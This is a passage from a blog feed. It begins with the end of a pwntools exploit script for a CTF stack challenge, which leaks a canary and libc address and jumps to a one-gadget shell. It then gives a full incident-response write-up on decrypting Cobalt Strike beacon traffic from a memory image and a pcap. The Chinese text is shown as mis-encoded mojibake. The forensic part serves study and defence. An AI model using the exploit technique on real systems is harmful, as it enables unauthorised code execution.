class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv(timeout=<span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">81</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv(timeout=<span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">secret_addr = <span class="number">0x804A060</span></span><br><span class="line">bss_addr   = <span class="number">0x0804A1A0</span></span><br><span class="line">offset = (e.got[<span class="string">&#x27;puts&#x27;</span>] - secret_addr) // <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset&quot;</span>,offset)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">81</span>)</span><br><span class="line"></span><br><span class="line">part_of_canary = p.recv(<span class="number">3</span>)</span><br><span class="line">canary = u32(<span class="string">b&#x27;\x00&#x27;</span> + part_of_canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Part:&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;puts addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadget = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + <span class="number">0x3a80c</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc-&gt;&#x27;</span>, <span class="built_in">hex</span>(puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.send(p32(canary)+p32(bss_addr+<span class="number">0x14</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p32(gadget))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">b&#x27;aaaa&#x27;</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8</span> + p32(bss_addr+<span class="number">0xc</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="REï¼ˆç»èµæ›´æ–°ä¸­ï¼‰"><a href="#REï¼ˆç»èµæ›´æ–°ä¸­ï¼‰" class="headerlink" title="REï¼ˆç»èµæ›´æ–°ä¸­ï¼‰"></a>REï¼ˆç»èµæ›´æ–°ä¸­ï¼‰</h2>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt_Strike æ—  .cobaltstrike.beacon_keys æµé‡è§£å¯†</title>
      <link href="/2025/09/13/Cobalt-Strike/"/>
      <url>/2025/09/13/Cobalt-Strike/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike-æ— -cobaltstrike-beacon-keys-æµé‡è§£å¯†"><a href="#Cobalt-Strike-æ— -cobaltstrike-beacon-keys-æµé‡è§£å¯†" class="headerlink" title="Cobalt_Strike æ—  .cobaltstrike.beacon_keys æµé‡è§£å¯†"></a>Cobalt_Strike æ—  .cobaltstrike.beacon_keys æµé‡è§£å¯†</h1><blockquote><p><em>æš‚ä¸”å…ˆå°±é¢˜è®ºé¢˜ï¼Œåç»­å°†æŠŠæ–‡ç« æ‰©å……ä¸º <strong>åº”æ€¥å“åº”ä¹‹CSæµé‡è§£å¯†ä¸€æ–‡é€š</strong></em></p></blockquote><h2 id="èµ°é©¬ç¯"><a href="#èµ°é©¬ç¯" class="headerlink" title="èµ°é©¬ç¯"></a>èµ°é©¬ç¯</h2><p>å…¶å®è¿™æ¬¡ç§»åŠ¨çš„æ¯”èµ›è´¨é‡å¾ˆé«˜ï¼Œæå…¶è´´è¿‘å®é™…ç”Ÿæ´»ä¸­çš„å·¥ä½œå†…å®¹ï¼ŒåŒ…æ‹¬<strong>æœåŠ¡å™¨å®‰å…¨é…ç½®ï¼Œæ•°æ®åˆ†çº§ï¼Œåº”æ€¥å“åº”</strong>ç­‰ã€‚</p><p>ç¬¬äºŒå¤©å‘å¸ƒäº†wpï¼Œæœ‰å¤ªå¤šé¢˜ç›®ä¸€ç¦»å¼€èµ›åœºå°±æˆåƒå¤æ‚¬æ¡ˆäº†ï¼Œè¿™å°±æ˜¯å›½ä¼çš„æ‹…å½“å•Šï¼å¯¹ç§»åŠ¨å¥½æ„Ÿupï¼(è™½ç„¶æ— å›¾/å¾ˆå¤šæ­¥éª¤ä¸€å¥å¸¦è¿‡)</p><p>å¯æƒœå»å¹´åœ¨ æ¹–å—å¤§å­¦å‚åŠ æ¯”èµ› å¯¼è‡´å¼€å­¦è¦ç¼“è€ƒï¼Œç­‰è€ƒè¯•ç»“æŸæ¯”èµ›åªå‰©ä¸‹ä¸€å°æ—¶å‡ºå¤´ï¼ŒæŠŠé¢˜ç›®éƒ½æ‰«äº†ä¸€éï¼Œå‘ç°è¿™é“åº”æ€¥å“åº”å·¥ä½œä¸­å‡ºç°çš„csæµé‡è§£å¯†ï¼Œå¾ˆæœ‰æ„æ€</p><h2 id="çŸ¥è¯†å­¦çˆ†ï¼ˆæ­£åœ¨æ–½å·¥ä¸­ï¼‰"><a href="#çŸ¥è¯†å­¦çˆ†ï¼ˆæ­£åœ¨æ–½å·¥ä¸­ï¼‰" class="headerlink" title="çŸ¥è¯†å­¦çˆ†ï¼ˆæ­£åœ¨æ–½å·¥ä¸­ï¼‰"></a>çŸ¥è¯†å­¦çˆ†ï¼ˆæ­£åœ¨æ–½å·¥ä¸­ï¼‰</h2><p>åœ¨åšé¢˜ä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹<code>cobalt_Strike</code></p><p>Cobalt Strike æ˜¯ä¸€æ¬¾å¾ˆå¸¸ç”¨çš„GUIçš„æ¡†æ¶å¼æ¸—é€å·¥å…·ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œwin exeæœ¨é©¬ç”Ÿæˆï¼Œwin dllæœ¨é©¬ç”Ÿæˆï¼Œjavaæœ¨é©¬ç”Ÿæˆï¼Œofficeå®ç—…æ¯’ç”Ÿæˆï¼Œæœ¨é©¬æ†ç»‘ï¼›é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ç­‰ã€‚</p><h3 id="åŠ å¯†ç®—æ³•"><a href="#åŠ å¯†ç®—æ³•" class="headerlink" title="åŠ å¯†ç®—æ³•"></a>åŠ å¯†ç®—æ³•</h3><p><code>Cobalt Strike</code> æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯æ˜¯é€šè¿‡ <code>SSL</code> åŠ å¯†é€šè®¯çš„ (é»˜è®¤è¯ä¹¦å¯¹ <code>cobaltstrike.store</code> )ã€‚</p><p><code>Beacon</code> çš„å…ƒæ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­è™½ç„¶ä½¿ç”¨çš„æ˜¯ <code>RSA</code> ç®—æ³•ï¼Œä½†æ˜¯ <code>Beacon</code> ä»»åŠ¡çš„ä¼ è¾“ä½¿ç”¨çš„å´æ˜¯ <code>AES</code> ç®—æ³•åŠ å¯†çš„ï¼Œè€Œ <code>AES</code> å¯†é’¥åˆ™æ˜¯ <code>Beacon</code> éšæœºç”Ÿæˆçš„ç„¶åé€šè¿‡ <code>RSA</code> äº¤æ¢ <code>AES</code>å¯†é’¥ã€‚åŠ è§£å¯†ç®—æ³•ä¸º <code>AES</code> ï¼Œå¯†é’¥ä½é•¿ <code>128</code> ï¼Œ<code>CBC</code> æ¨¡å¼ï¼Œå¡«å……æ ‡å‡† <code>PKCS7</code> ï¼Œå…¶é€šä¿¡å…·ä½“æµç¨‹å¦‚ä¸‹ã€‚<img src="/2025/09/13/Cobalt-Strike/image-20230930201229567.webp" alt="image-20230930201229567"></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><blockquote><p>é¢˜ç›®æè¿°ï¼š</p><p>è´¢åŠ¡éƒ¨çš„å°å¼ æ”¶åˆ°ä¸€å°æ ‡é¢˜ä¸ºã€Šå…³äº2025å¹´éƒ¨åˆ†èŠ‚å‡æ—¥å®‰æ’çš„é€šçŸ¥ã€‹çš„é‚®ä»¶ã€‚å°å¼ æœªç»éªŒè¯ä¾¿åŒå‡»æ‰§è¡Œï¼Œéšåç”µè„‘çªç„¶è“å±é‡å¯ã€‚é‡å¯åï¼Œå…¬å¸å†…éƒ¨ç›‘æ§ç³»ç»Ÿæ£€æµ‹åˆ°å¼‚å¸¸å¤–è”æµé‡ï¼Œç–‘ä¼¼è´¢åŠ¡æ•°æ®æ³„éœ²ã€‚ä½œä¸ºåº”æ€¥å“åº”ä¸“å®¶çš„ä½ ï¼Œè¯·ä½ åˆ†æå‡ºé»‘å®¢çš„æ”»å‡»è¡Œä¸ºã€‚</p></blockquote><p>ä¸€èˆ¬å›½å†…è€ƒcsæµé‡åˆ†æçš„é¢˜ç›®éƒ½<strong>åªç»™ä¸€ä¸ªæµé‡åŒ…</strong>ï¼ŒåŒæ—¶ä¼šç»™<code>.cobaltstrike.beacon_keys</code>æ–‡ä»¶ï¼Œæå‡ºæ¥å°±èƒ½ç”¨<code>CTF-NetA</code>å·¥å…·ä¸€æŠŠæ¢­äº†ï¼Œä½†æ˜¯è¿™é“é¢˜æ˜¯æ²¡ç»™ã€‚</p><p>è¿™é‡Œå°±éœ€è¦ä¸€äº›tricksæ¥è·å–AES å’Œ HMAC å¯†é’¥</p><p>ç†è®ºå¯è¡Œçš„åšæ³•æœ‰ä¸¤ç§ï¼š</p><ol><li>è§£æ<strong>stage</strong>æ–‡ä»¶ (éå¸¸åƒæ—¶é—´å’Œè®¡ç®—èµ„æºï¼Œä½†ä»…éœ€æµé‡æ–‡ä»¶ï¼Œä¼˜ç‚¹æ˜¯ä¸éœ€è¦å—å®³æœºçš„å†…å­˜é•œåƒ)</li><li>ä»<strong>å†…å­˜é•œåƒä¸­æå–Beaconè¿›ç¨‹çš„æ•°æ®</strong> (æœ¬é¢˜ç»™äº†å—å®³è€…çš„ç”µè„‘å†…å­˜é•œåƒï¼Œé¢„æœŸè§£ä¹Ÿæ­£æ˜¯è¿™æ ·)</li></ol><h2 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h2><h3 id="å…±é€šçº¿"><a href="#å…±é€šçº¿" class="headerlink" title="å…±é€šçº¿"></a>å…±é€šçº¿</h3><h4 id="å†…å­˜åˆ†æ"><a href="#å†…å­˜åˆ†æ" class="headerlink" title="å†…å­˜åˆ†æ"></a>å†…å­˜åˆ†æ</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#ä»¥ä¸‹å‡ä¸ºè°ƒç”¨volatilityçš„æŒ‡ä»¤ï¼Œå…·ä½“å†™æ³•æ ¹æ®è‡ªå·±æœ¬åœ°ç¯å¢ƒæ¥</span><br><span class="line">-f XiaoZhang-PC-DESKTOP.raw imageinfo</span><br><span class="line">-f XiaoZhang-PC-DESKTOP.raw --profile=Win10x64_19041 filescan|grep Desktop</span><br><span class="line">-f XiaoZhang-PC-DESKTOP.raw windows.netscan</span><br></pre></td></tr></table></figure><p>ç”¨å„ç§å–è¯å·¥å…·éƒ½å¯ä»¥éå¸¸è½»æ¾çš„å‘ç° <code>å…³äº2025å¹´éƒ¨åˆ†èŠ‚å‡æ—¥å®‰æ’çš„é€šçŸ¥.exe</code> çš„å¤–è”åœ°å€æ˜¯<code>192.168.27.132</code>ï¼Œç«¯å£ä¸º<code>12580</code></p><h4 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h4><p>åˆ†æpcapæµé‡åŒ…ï¼Œå‘ç°å¾ˆæ˜æ˜¾çš„CobalStrikeæµé‡ç‰¹å¾ï¼Œæ‰¾é€šä¿¡æ•°æ®</p><h3 id="è§£æ³•1ï¼ˆç†è®ºå¯è¡Œï¼‰"><a href="#è§£æ³•1ï¼ˆç†è®ºå¯è¡Œï¼‰" class="headerlink" title="è§£æ³•1ï¼ˆç†è®ºå¯è¡Œï¼‰"></a>è§£æ³•1ï¼ˆç†è®ºå¯è¡Œï¼‰</h3><p>æœ¬é¢˜æä¾›çš„å†…å­˜é•œåƒ</p><p>é€šè¿‡<code>http.request.uri matches &quot;/....$&quot;</code>ç­›é€‰csæœ¨é©¬ä¸Šçº¿æ—¶æ‰€å‘é€çš„stageæ–‡ä»¶</p><p>æ¥ç€é€šè¿‡<a href="https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/">1768.py</a>è§£å¯†è¯¥æ–‡ä»¶ï¼Œå°†publickeyå¤šä½™0å»é™¤å¾—åˆ°å…¬é’¥</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 cs_dec_stage.py TJvI</span><br></pre></td></tr></table></figure><p><img src="/2025/09/13/Cobalt-Strike/image-20250913135800316.png" alt="image-20250913135800316" style="zoom:50%;"></p><p>ä¹‹åç”¨<code>cs_invert_pub.py</code>å°†å…¬é’¥è½¬ä¸ºpemæ ¼å¼ï¼Œå¹¶æå–å…¶ä¸­çš„nå’Œe</p><p><img src="/2025/09/13/Cobalt-Strike/image-20250913135712326.png" alt="image-20250913135712326" style="zoom:50%;"></p><p>å°†nè¿›è¡Œæ¨¡æ•°åˆ†è§£ï¼Œå¾—åˆ°på’Œq</p><p>è¿™é‡Œå¯ä»¥é€‰ç”¨<code>yafu</code>æˆ–<code>RsaCtfTool</code></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">.\yafu-x64.exe â€œfactor(<span class="number">110209881007357893823335805800713195851127501725957565233140927957700204009298219831317940655870344979959172203765131703915110847527123581538957802617902884782216119145118127834057251159376653146542095451104320803312070357977411524497260098391204298785177487587770308799475139763729699721645361283357313642349</span>)â€œ</span><br></pre></td></tr></table></figure><blockquote><p>æœ€åƒæ—¶é—´å’Œè®¡ç®—èµ„æºçš„ä¸€æ­¥ï¼Œç¬”è€…è¿™é‡Œå°è¯•äº†yafuï¼Œ2ä¸ªå°æ—¶æ²¡è·‘å‡ºæ¥ï¼Œæˆ‘å°±æ”¾å¼ƒäº†</p><p>åç»­æˆ‘å°†å†å°è¯•RsaCtfToolï¼ŒRsaCtfToolä¾æ—§å¤±è´¥ï¼Œ</p><p>äºæ˜¯æˆ‘å°è¯•äº†è¥¿æ¹–è®ºå‰‘ç±»ä¼¼é¢˜ç›®çš„å…¬é’¥æ•°æ®ï¼Œç§’åˆ†è§£ã€‚</p><p><strong>è¯´æ˜è¿™é¢˜å¦‚æœè¦åœ¨æœ‰é™æ—¶é—´å†…åˆ†è§£nçš„è¯å¯¹äºæ•°æ®æœ‰äº›è¦æ±‚</strong>ï¼Œè¿™é¢˜çš„å…¬é’¥å¹¶ä¸é€‚åˆè¿™ç§è§£æ³•</p></blockquote><h4 id="è¿›å…¥æŸä¸€æ¡ç¥å¥‡çš„ä¸–ç•Œçº¿"><a href="#è¿›å…¥æŸä¸€æ¡ç¥å¥‡çš„ä¸–ç•Œçº¿" class="headerlink" title="è¿›å…¥æŸä¸€æ¡ç¥å¥‡çš„ä¸–ç•Œçº¿"></a>è¿›å…¥æŸä¸€æ¡ç¥å¥‡çš„ä¸–ç•Œçº¿</h4><p>é€šè¿‡å¯¹å…¬ç½‘æš´éœ²çš„ Cobalt Strike æœåŠ¡å™¨è¿›è¡Œåˆ†æè¯†åˆ«ï¼Œå‘ç°è®¸å¤šæœåŠ¡å™¨ä½¿ç”¨ç›¸åŒçš„å…¬é’¥ï¼Œè¿™æ„å‘³ç€ä»–ä»¬ä½¿ç”¨çš„ <code>.cobaltstrike.beacon_keys</code> æ–‡ä»¶ç›¸åŒï¼Œå…¬ç§é’¥éƒ½ç›¸åŒã€‚</p><p>å› ä¸ºè¿™äº›äººä½¿ç”¨çš„éƒ½æ˜¯ Cobalt Strike çš„ç ´è§£ç‰ˆï¼Œè€Œåœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶ç”Ÿæˆçš„ <code>.cobaltstrike.beacon_keys</code> æ–‡ä»¶ä¹Ÿè¢«åŒ…å«åœ¨ç ´è§£ç‰ˆä¸­å…±äº«å‡ºå»äº†ã€‚</p><p>é€šè¿‡ VirusTotal è¿›è¡Œæ ·æœ¬æ£€ç´¢ï¼Œå‘ç°äº† 10 ä¸ªç ´è§£ç‰ˆ Cobalt Strike çš„ ZIP å‹ç¼©åŒ…ï¼Œè¿™äº›å‹ç¼©åŒ…ä¸­æ ¹æ® <code>.cobaltstrike.beacon_keys</code> æå–äº† 6 ä¸ª RSA å¯†é’¥å¯¹ã€‚å…¶ä¸­æœ‰ 2 ä¸ªå¯†é’¥å¯¹è¢«å¹¿æ³›ä½¿ç”¨ï¼Œå‘ç°çš„ Cobalt Strike æœåŠ¡å™¨ä¸­æœ‰ <strong>25%</strong>ï¼ˆ1500 ä½™ä¸ªï¼‰ä½¿ç”¨çš„éƒ½æ˜¯è¿™äºŒè€…ä¹‹ä¸€ã€‚</p><p>é€šè¿‡ <code>1768.py</code> æå– Cobalt Strike Beacon çš„é…ç½®æ—¶ä¼šæ˜¾ç¤ºæ˜¯å¦ä¸ºå·²çŸ¥çš„ç§é’¥ã€‚</p><p><strong>å¦‚æœè¿æ°”å¥½â€”â€”æ”»å‡»è€…ä½¿ç”¨äº†ç ´è§£ç‰ˆçš„Cobalt Strikeï¼Œå°±å¯ä»¥ä½¿ç”¨å·²çŸ¥çš„ç§é’¥</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 cs_dec_stage.py -V TJvI #ä¼šæ˜¾ç¤ºå·²çŸ¥çš„ç§é’¥</span><br></pre></td></tr></table></figure><h4 id="å›åˆ°å¸¸è§„ä¸–ç•Œçº¿"><a href="#å›åˆ°å¸¸è§„ä¸–ç•Œçº¿" class="headerlink" title="å›åˆ°å¸¸è§„ä¸–ç•Œçº¿"></a>å›åˆ°å¸¸è§„ä¸–ç•Œçº¿</h4><p>ç”¨cs_calc_pri.pyé€šè¿‡på’Œqè®¡ç®—<strong>ç§é’¥</strong>ï¼Œæ¥ç€è·³è½¬è‡³<code>ç©·å“¥ä»¬æ‰“æ³•-é€šè¿‡ç§é’¥è§£å¯†Cookie</code></p><h3 id="è§£æ³•2ï¼ˆå®é™…è§£æ³•ï¼‰"><a href="#è§£æ³•2ï¼ˆå®é™…è§£æ³•ï¼‰" class="headerlink" title="è§£æ³•2ï¼ˆå®é™…è§£æ³•ï¼‰"></a>è§£æ³•2ï¼ˆå®é™…è§£æ³•ï¼‰</h3><h4 id="æå–å†…å­˜é•œåƒä¸­çš„Beaconè¿›ç¨‹æ–‡ä»¶"><a href="#æå–å†…å­˜é•œåƒä¸­çš„Beaconè¿›ç¨‹æ–‡ä»¶" class="headerlink" title="æå–å†…å­˜é•œåƒä¸­çš„Beaconè¿›ç¨‹æ–‡ä»¶"></a>æå–å†…å­˜é•œåƒä¸­çš„Beaconè¿›ç¨‹æ–‡ä»¶</h4><p>ä½¿ç”¨procdumpæˆ–è€…volatilityç­‰å·¥å…·ï¼Œæå–beaconè¿›ç¨‹ä¸ºdmpæ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">CTF</span>\<span class="title">misc</span>\<span class="title">lovelymem</span>\<span class="title">Tools</span>\<span class="title">python27</span>\<span class="title">python27.exe</span> <span class="title">D</span>:\<span class="title">CTF</span>\<span class="title">misc</span>\<span class="title">lovelymem</span>\<span class="title">Tools</span>\<span class="title">volatility2_python</span>\<span class="title">vol.py</span> -<span class="title">f</span> <span class="title">D</span>:/<span class="title">CTF</span>/<span class="title">misc</span>/<span class="title">vol2</span>/è´¢åŠ¡å°å¼ /<span class="title">XiaoZhang</span>-<span class="title">PC</span>-<span class="title">DESKTOP.raw</span> --<span class="title">profile</span>=<span class="title">Win10x64_19041</span> <span class="title">memdump</span> -<span class="title">p</span> 6492 --<span class="title">dump</span>-<span class="title">dir</span>=./</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨<a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">cs-extract-key.py</a>å»æå–<code>AES Key</code>å’Œ<code>HMAC Key</code></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python .\cs_extract_key.py .\<span class="number">6492</span>.dmp </span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…¶åŸç†æ˜¯æŸ¥æ‰¾<code>0x0000BEEF</code>åºåˆ—å·å¤´ï¼Œè¿™ä¸ªåºåˆ—å·å¤´æ˜¯æœªè¢«åŠ å¯†çš„å…ƒæ•°æ®çš„å¤´éƒ¨ï¼Œ<strong>å¾ˆæœ‰å¯èƒ½ä¸æ­£ç¡®</strong></p><h4 id="æå–åŠ å¯†æµé‡ä¸­çš„raw-data"><a href="#æå–åŠ å¯†æµé‡ä¸­çš„raw-data" class="headerlink" title="æå–åŠ å¯†æµé‡ä¸­çš„raw data"></a>æå–åŠ å¯†æµé‡ä¸­çš„raw data</h4><p>å¦‚æœæ­¤æ—¶æœ‰åŒ…å«åŠ å¯†æ•°æ®çš„æµé‡åŒ…ï¼Œå¯ä»¥ç”¨<a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">cs-parse-http-traffic.py</a>æå–åŠ å¯†æµé‡ä¸­çš„raw data</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 cs-parse-http-traffic.py -k unknown XiaoZhang-PC.pcapng</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨Beaconè¿›ç¨‹å’Œæµé‡ä¸­çš„æ•°æ®è·å–AES-keyå’ŒHMAC-Key"><a href="#åˆ©ç”¨Beaconè¿›ç¨‹å’Œæµé‡ä¸­çš„æ•°æ®è·å–AES-keyå’ŒHMAC-Key" class="headerlink" title="åˆ©ç”¨Beaconè¿›ç¨‹å’Œæµé‡ä¸­çš„æ•°æ®è·å–AES keyå’ŒHMAC Key"></a>åˆ©ç”¨Beaconè¿›ç¨‹å’Œæµé‡ä¸­çš„æ•°æ®è·å–AES keyå’ŒHMAC Key</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\Users\zhang\Desktop\<span class="number">1</span>\zhang&gt; python cs_extract_key.py -t <span class="number">9</span>ea8c274326a1db1e25142558f2bac154d8139bc18a19f5d772786e8075d6d8fca4d82ed8a7253e3e2c17110e911ff16 <span class="number">6492</span>.dmp</span><br><span class="line">######################################</span><br><span class="line"><span class="function">File: 6492.<span class="title">dmp</span></span></span><br><span class="line"><span class="function"><span class="title">Searching</span> <span class="title">for</span> <span class="title">AES</span> <span class="title">and</span> <span class="title">HMAC</span> <span class="title">keys</span></span></span><br><span class="line"><span class="function"><span class="title">Searching</span> <span class="title">after</span> <span class="title">sha256</span>\<span class="title">x00</span> <span class="title">string</span> (0<span class="title">x61a44</span>)</span></span><br><span class="line"><span class="function">######################################</span></span><br><span class="line"><span class="function"><span class="title">AES</span> <span class="title">key</span> <span class="title">position</span>: 0<span class="title">x00068c60</span></span></span><br><span class="line"><span class="function"><span class="title">AES</span> <span class="title">Key</span>:  <span class="title">a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7</span></span></span><br><span class="line"><span class="function"><span class="title">HMAC</span> <span class="title">key</span> <span class="title">position</span>: 0<span class="title">x00068c70</span></span></span><br><span class="line"><span class="function"><span class="title">HMAC</span> <span class="title">Key</span>: 35<span class="title">d34ac8778482751682514436d71e09</span></span></span><br><span class="line"><span class="function">######################################</span></span><br><span class="line"><span class="function"><span class="title">SHA256</span> <span class="title">raw</span> <span class="title">key</span>: 35<span class="title">d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7</span></span></span><br></pre></td></tr></table></figure><h4 id="è§£å¯†CobalStrikeæµé‡"><a href="#è§£å¯†CobalStrikeæµé‡" class="headerlink" title="è§£å¯†CobalStrikeæµé‡"></a>è§£å¯†CobalStrikeæµé‡</h4><p>é€šè¿‡<code>CS_Task_And_Return_AES_Decrypt.py</code>è§£å¯†æ•°æ®</p><p><img src="/2025/09/13/Cobalt-Strike/image-20250916175107830.png" alt="image-20250916175107830"></p><p>ğŸ‘†æ‰¾åˆ°è¯»å–æ•æ„Ÿä¿¡æ¯secret.txtçš„è¯·æ±‚åŒ…</p><p>ğŸ‘‡ä¸€ä¸ªå°±æ˜¯è¢«çªƒå–çš„æ•æ„Ÿä¿¡æ¯</p><p><img src="/2025/09/13/Cobalt-Strike/image-20250916175225730.png" alt="image-20250916175225730"></p><p><code>5c1eb2c4-0b85-491f-8d50-4e96</code></p><h2 id="å¦‚æœé¢˜ç›®ç®€å•äº›ï¼Œç»™äº†-cobaltstrike-beacon-keysï¼Ÿ"><a href="#å¦‚æœé¢˜ç›®ç®€å•äº›ï¼Œç»™äº†-cobaltstrike-beacon-keysï¼Ÿ" class="headerlink" title="å¦‚æœé¢˜ç›®ç®€å•äº›ï¼Œç»™äº†.cobaltstrike.beacon_keysï¼Ÿ"></a>å¦‚æœé¢˜ç›®ç®€å•äº›ï¼Œç»™äº†.cobaltstrike.beacon_keysï¼Ÿ</h2><h3 id="å¯Œå“¥æ‰“æ³•"><a href="#å¯Œå“¥æ‰“æ³•" class="headerlink" title="å¯Œå“¥æ‰“æ³•"></a>å¯Œå“¥æ‰“æ³•</h3><p>å¯¼å…¥keyæ–‡ä»¶å<strong>CTF-NetAä¸€æŠŠæ¢­</strong>ï¼šä½†æ˜¯æˆ‘è®°å¾—è´­ä¹°è¿™ä¸ªå·¥å…·è¦å¿«100å—</p><h3 id="ç©·å“¥ä»¬æ‰“æ³•"><a href="#ç©·å“¥ä»¬æ‰“æ³•" class="headerlink" title="ç©·å“¥ä»¬æ‰“æ³•"></a>ç©·å“¥ä»¬æ‰“æ³•</h3><h4 id="ç§é’¥è·å–"><a href="#ç§é’¥è·å–" class="headerlink" title="ç§é’¥è·å–"></a>ç§é’¥è·å–</h4><p><strong>åˆ©ç”¨ .cobaltstrike.beacon_keys æ–‡ä»¶</strong></p><p><code>.cobaltstrike.beacon_keys</code>æ–‡ä»¶æœ¬è´¨ä¸Šä¸ºKeyPairçš„Javaå¯¹è±¡ï¼ŒPythonçš„javaobjå¯ä»¥ç›´æ¥è¯»å–å…¶ä¸­å­˜å‚¨çš„æ•°æ®</p><p>åˆ©ç”¨<code>parse_beacon_keys.py</code>è¯»å–å…¬é’¥å’Œç§é’¥ï¼ˆå¦‚æœæ˜¯python3ç¯å¢ƒè£…çš„æ˜¯ javaobj-py3 ï¼‰</p><h4 id="é€šè¿‡ç§é’¥è§£å¯†Cookie"><a href="#é€šè¿‡ç§é’¥è§£å¯†Cookie" class="headerlink" title="é€šè¿‡ç§é’¥è§£å¯†Cookie"></a>é€šè¿‡ç§é’¥è§£å¯†Cookie</h4><p>ç”¨<code>Beacon_metadata_RSA_Decrypt.py</code>é€šè¿‡ç§é’¥è§£å¯†å¿ƒè·³åŒ…ä¸­çš„Cookieæ•°æ®ï¼Œæ‹¿åˆ°<code>AES Key</code>å’Œ<code>HMAC Key</code></p><p>ç”¨<code>Beacon_metadata_moreInfo_RSA_Decrypt.py</code>å¯ä»¥è·å¾—<code>host</code>ã€<code>PC name</code>ã€<code>username</code>ã€<code>AES key</code>ã€<code>HMAC key</code>ç­‰æ›´å¤šä¿¡æ¯</p><p>æœ‰keyäº†å°±é€šè¿‡<code>CS_Task_And_Return_AES_Decrypt.py</code>è§£å¯†æ•°æ®</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.s1mh0.cn/blog/index.php/2025/01/27/cobaltstrike_dec/#cobaltstrikebeacon_keys">CobaltStrikeæµé‡è§£å¯† â€“ S1mh0â€™s Blog</a>ï¼ˆè„šæœ¬å‡ºå¤„ï¼‰</p><p><a href="https://forum.butian.net/share/1861">https://forum.butian.net/share/1861</a></p><p><a href="https://www.cnblogs.com/fleurs/p/19007755">https://www.cnblogs.com/fleurs/p/19007755</a></p><p>è¥¿æ¹–è®ºå‰‘<a href="https://mp.weixin.qq.com/s/gXYLwdup6HYd_rETUSb9aA">https://mp.weixin.qq.com/s/gXYLwdup6HYd_rETUSb9aA</a></p><p>è¥¿æ¹–è®ºå‰‘<a href="https://www.cnblogs.com/alexander17/p/18737592">https://www.cnblogs.com/alexander17/p/18737592</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Œret2allã€æœ‰å…³æ ˆçš„ä¸€åˆ‡</title>
